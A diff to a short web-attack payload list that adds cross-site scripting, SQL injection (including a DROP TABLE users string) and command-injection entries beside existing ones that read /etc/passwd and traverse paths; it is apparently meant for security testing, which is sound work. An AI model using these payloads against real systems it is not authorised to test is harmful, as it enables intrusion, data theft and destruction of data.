@@ -2,16 +2,22 @@ XSS:
 <script>alert('XSS');</script>
 <img src=x onerror=alert(String.fromCharCode(88,83,83)) />
 <a href="javascript:alert('XSS')">Click me</a>
+<input type="text" value="XSS" onmouseover="alert('XSS');">
+
 
 SQLI:
 ' OR '1'='1
 ' UNION SELECT 1, 2, 3--
 ' UNION SELECT table_name, column_name FROM information_schema.columns--
+'; DROP TABLE users --
+
 
 Command Injection
-127.0.0.1; ping -c 1 example.com
+127.0.0.1; ping google.com
 ; ls
 ; cat /etc/passwd
+; ls \; id
+; echo $PATH
 
 LFI:
 ../../../etc/passwd
